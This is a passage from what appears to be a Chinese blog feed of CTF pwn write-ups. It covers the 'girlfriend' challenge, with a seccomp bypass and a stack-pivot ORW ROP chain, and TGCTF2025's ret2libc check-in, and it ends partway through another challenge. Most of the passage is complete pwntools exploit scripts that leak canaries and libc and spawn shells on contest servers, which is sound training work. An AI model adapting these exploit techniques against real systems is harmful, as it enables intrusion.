class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20551</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./arknights&#x27;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x4018e5</span></span><br><span class="line">leave_ret=<span class="number">0x401393</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">bss_add=<span class="number">0x405b00</span></span><br><span class="line">call_read=<span class="number">0x4018a8</span></span><br><span class="line">sys_plt=e.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">r.recvuntil(<span class="string">&quot;欢迎使用明日方舟寻访模拟器！祝你好运~\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;请选择：[1]单抽 [2]十连 [3]自定义数量 [4]结束抽卡\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;请选择：[1]向好友炫耀 [2]退出\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;请输入你的名字：&quot;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss_add+<span class="number">0x40</span>)+p64(call_read)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">fake_stack=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(pop_rdi)+p64(bss_add)+p64(ret)+p64(sys_plt)</span><br><span class="line">fake_stack=fake_stack.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2=fake_stack+p64(bss_add)+p64(leave_ret)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h2><h3 id="复现-ret2libc-orw-ROP"><a href="#复现-ret2libc-orw-ROP" class="headerlink" title="复现&#x2F;ret2libc&#x2F;orw&#x2F;ROP"></a>复现&#x2F;ret2libc&#x2F;orw&#x2F;ROP</h3><p>源码<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  sub_1309(a1, a2, a3);</span><br><span class="line">  sub_1372();</span><br><span class="line">  sub_14F6();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_1519();</span><br><span class="line">    <span class="keyword">switch</span> ( sub_157C(v5) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        sub_15C9();</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        sub_1678();</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        sub_1708();</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        sub_179B();</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;BabyShark will be very sad.....&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;no no no....&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>菜单<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_1519</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will give you some options:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. GirlFriend!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. BuyFlowers&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Reply&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. SingSongs&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. I don&#x27;t care&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your Choice:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中有用的选项源码如下<br><br>选项1<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_15C9</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">56</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_4094 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have already tried to talk to her, and she left...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    dword_4094 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Girl is very beautiful!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;what do you want to say to her?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x50u</span>LL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You say: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;but she left.........&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选项2<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_1678</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you want to buy her flowers?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Y/N&quot;</span>);</span><br><span class="line">  v1 = getchar();</span><br><span class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">89</span> || v1 == <span class="number">121</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_4090 &lt;= <span class="number">200</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;you don&#x27;t have enough money&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You did it!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;echo /flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;what a pity!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选项3<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_1708</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4098 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ++dword_4098;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You should tell her your name first&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, byte_4060, <span class="number">0x100u</span>LL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(byte_4060);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You also get her name: XM&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good luck!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can only introduce yourself twice.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到第二个选项，一看可以直接echo &#x2F;flag，还有这种好事？马上通过选项3修改dword_4090的值大于200，然后发现输出了You did it!\n却没有flag<br>接着发现程序开启了沙箱（悲），禁用了系统调用和open函数并且使⽤read函数的时候第⼀次参数只允许为0，所以这⾥我们需要close(0)之后再调⽤openat打开flag⽂件进⾏读取，否则⽆法使⽤read读取，具体如下所示<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools dump ./pwnpwn/xyctf_girlfriend</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x0c 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0014</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x09 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0014</span><br><span class="line"> 0005: 0x15 0x08 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0014</span><br><span class="line"> 0006: 0x15 0x07 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0014</span><br><span class="line"> 0007: 0x15 0x06 0x00 0x00000142  <span class="keyword">if</span> (A == execveat) goto 0014</span><br><span class="line"> 0008: 0x15 0x00 0x04 0x00000000  <span class="keyword">if</span> (A != <span class="built_in">read</span>) goto 0013</span><br><span class="line"> 0009: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 <span class="comment"># read(fd, buf, count)</span></span><br><span class="line"> 0010: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0014</span><br><span class="line"> 0011: 0x20 0x00 0x00 0x00000010  A = fd <span class="comment"># read(fd, buf, count)</span></span><br><span class="line"> 0012: 0x15 0x00 0x01 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p><strong>open函数可以用openat代替</strong>，于是进行orw<br>程序开启了canary保护和PIE保护，选项三有格式化字符串漏洞，可以利用来泄露canary，libc地址和程序基地址<br>选项1的溢出长度并不足以进行orw，于是我们把rop链用选项三写入，然后利用选项一栈迁移过去即可<br>需要注意的是，迁移过去的前56字节不要写rop链，不然会执行失败（还不知道为啥）<br>exp如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20331</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./xyctf_girlfriend&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">talk</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;what do you want to say to her?&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">myname</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;You should tell her your name first\n&#x27;</span>,myname)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your name:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;%15$p%17$p%7$p&#x27;</span></span><br><span class="line">payload1=payload1.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">name(payload1)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(r.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leak_add=<span class="built_in">int</span>(r.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">elfbase=<span class="built_in">int</span>(r.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x18d9</span></span><br><span class="line">libcbase=leak_add+<span class="number">48</span>-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">pop_rdi=libcbase+<span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi=libcbase+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12=libcbase+<span class="number">0x11f2e7</span></span><br><span class="line">pop_rax=libcbase+<span class="number">0x45eb0</span></span><br><span class="line">leave_ret=libcbase+<span class="number">0x4da83</span></span><br><span class="line">open_add=libcbase+libc.sym[<span class="string">&#x27;openat&#x27;</span>]</span><br><span class="line">read_add=libcbase+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_add=libcbase+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">close_add=libcbase+libc.sym[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">name_add=elfbase+<span class="number">0x4060</span></span><br><span class="line">ropchain=<span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(close_add)+p64(pop_rdi)+p8(<span class="number">156</span>)+p8(<span class="number">255</span>)*<span class="number">7</span>+p64(pop_rsi)+p64(name_add)+p64(pop_rdx_r12)</span><br><span class="line">ropchain+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(open_add)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read_add)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">ropchain+=p64(pop_rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(write_add)</span><br><span class="line">ropchain=ropchain.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">name(ropchain)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(canary)+p64(name_add+<span class="number">48</span>)+p64(leave_ret)</span><br><span class="line">talk(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> stack </category>
          
          <category> ROP </category>
          
          <category> ret2libc </category>
          
          <category> 栈迁移 </category>
          
          <category> orw </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TGCTF2025</title>
      <link href="/2025/05/02/TGCTF2025/"/>
      <url>/2025/05/02/TGCTF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>简单的ret2libc,源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;As a student who has been learning pwn for half a year\n&quot;</span></span><br><span class="line">    <span class="string">&quot;basic ROP is an essential skill that everyone should master. \n&quot;</span></span><br><span class="line">    <span class="string">&quot;Therefore, hurry up and complete the check-in. \n&quot;</span></span><br><span class="line">    <span class="string">&quot;Welcome to the Hangzhou Normal University CTF competition, please leave your name.&quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无需多言，直接放exp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span>,<span class="number">31903</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./tgctf_sign&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./tgctf_sign&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401176</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">main=<span class="number">0x401178</span></span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret)+p64(main)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name.&#x27;</span>,payload1)</span><br><span class="line">puts_add=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase=puts_add-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_add=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_add=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(bin_add)+p64(sys_add)+p64(main)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><h3 id="ROP-静态链接-shellcode"><a href="#ROP-静态链接-shellcode" class="headerlink" title="ROP&#x2F;静态链接&#x2F;shellcode"></a>ROP&#x2F;静态链接&#x2F;shellcode</h3><p>源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">200</span>]; <span class="comment">// [esp+0h] [ebp-D0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+C8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;could you tell me your name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">256</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;i heard you love gets,right?&quot;</span>);</span><br><span class="line">  